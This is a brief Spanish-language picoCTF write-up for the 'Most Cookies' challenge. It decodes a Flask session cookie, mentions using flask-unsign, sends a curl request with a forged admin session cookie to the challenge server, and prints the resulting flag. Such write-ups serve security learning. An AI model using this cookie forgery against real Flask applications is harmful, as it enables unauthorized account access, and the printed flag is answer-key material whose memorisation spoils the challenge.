**Reto:** Most Cookies

**Descripción:**
Muy bien, suficiente de usar mi propio cifrado. Las galletas de sesión de Flask deben ser muy seguras. [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)
**Solución:**
vemos las cookies y encontramos 
brandonogc0107-picoctf@webshell:~$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-8w7Q.SiEUoa6Tb0F1229cAf885CJaTgg |base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input 
despues usamos flask-unsign para descifrar la nueva bandera 

curl -s http://mercury.picoctf.net:6259/display -H "Cookie:session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-9JGA.gmOXp6Qqr05vr9w-oiTNKj0_Raw" | grep pico

==picoCTF{pwn_4ll_th3_cook1E5_5f016958}==
**Notas adicionales:**

**Referencias:** 
https://www.youtube.com/watch?v=ufs1xqSQCUM
